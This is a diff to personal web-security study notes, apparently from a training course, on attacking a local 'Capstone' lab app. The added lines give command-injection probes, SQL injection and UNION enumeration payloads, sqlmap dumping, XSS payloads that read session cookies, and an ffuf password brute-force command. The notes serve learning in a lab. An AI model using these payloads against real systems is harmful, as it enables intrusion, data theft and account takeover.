@@ -2207,6 +2207,7 @@ how it works:
 `&& ls -la`
 `; ls -la #`
 `| ls -la`
+`' or 1=1-- -`
 ```bash
 ; sleep 10
 ; ping -c 10 127.0.0.1
@@ -2652,7 +2653,7 @@ if we upload this file:
 ![[Pasted image 20240310160926.png]]
 <span style="color:#00b050">we'll get the /etc/pass file </span>    (to see better format => `CTRL+U` )
 
-#### IDOR - Insecure Direct Object Reference
+### IDOR - Insecure Direct Object Reference
 IDOR -->  Insicure Direct Object Reference
 it's:
 an <span style="color:#00b050">access control issue</span> where:
@@ -2698,12 +2699,73 @@ we can automate this process and writing a script to find -->  all the admin acc
 ## Capstone
 - created an account
 - logged in
-### SQL Injection
+
+### Enumerate the website - Capstone
+`ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -e .php -recursion`
+
+### SQL Injection - Capstone
 - tested if there are potential SQL injection in the input
 - also with Burp and Repeater
-#### sqlmap
+#### sqlmap - Capstone
 - copy a clean request from the -->  Add Rating feature
 - save it inside a txt file
 - `sqlmap -r req_review.txt --dump`
   ![[Pasted image 20240310173954.png]]
+#### Manual - Capstone
+if you type after the URL -->  '`' or 1=1-- -`
+=>
+the page returns all the coffies
+
+##### UNION - Capstone
+let's try using union
+<span style="background:#fff88f">first we need to find the n° of columns</span>
+at least we have 7 columns -->  ovvero coffe name, Scoring, Region, Notes, Varietal, Customer rating, Scoring, Region, Notes, Varietal
+=>
+with 7 null it works:
+`' union select null, null, null, null, null, null, null-- -`
+
+<span style="background:#fff88f">figure out which column is which output:</span>
+`' union select null, 'string', null, null, null, null, null-- -`
+![[Pasted image 20240310183059.png]]
+=>
+
+<span style="background:#fff88f">find tables:</span>
+`' union select null, TABLE_NAME,null, null, null, null, null FROM INFORMATION_SCHEMA.TABLES-- -`
+![[Pasted image 20240310183431.png]]
+
+### XSS - Capstone
+when you login:
+the mex that you see in the website is also reflected in the URL
+=>
+![[Pasted image 20240310181649.png]]
+
+it's  XSS reflected vulnerable:
+`<script> prompt(1) </script>`
+![[Pasted image 20240310181735.png]]
+
+<span style="color:#00b050">comment input is vulnerable to XSS:</span>
+- if you try with `<script> prompt(1) </script>` -->  it opens the prompt
+=>
+it's a <span style="color:#00b050">stored XSS</span> -->  bc if you setup [[cheet#Firefox Multi-Account Containers]]
+                   =>
+                   and open the same pag as a new user -->  you'll get the same prompt
+
+with:
+`<script> alert(document.cookie)</script>` 
+<span style="color:#00b050">we got a PHP SESSION cookie</span> -->  PHPSESSID=67470273aacacd80dc05b4642f824808
+
+
+### Authentication attack - Capstone
+Copy one single request with Burpsuite:
+- turn on FoxyProxy
+- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- send as credentials -->  admin:admin
+- open the req into Burp 
+- <span style="color:#00b050">Save the response Length </span>-->  (3376)
+- Copy the req > Save it inside a txt file
+- we already found some admin account =>  we'll fuzz only the passwords
+- `password = FUZZPASS`
+![[Pasted image 20240310180653.png]]
+=>
+`ffuf -request req_login.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt:FUZZPASS`
 
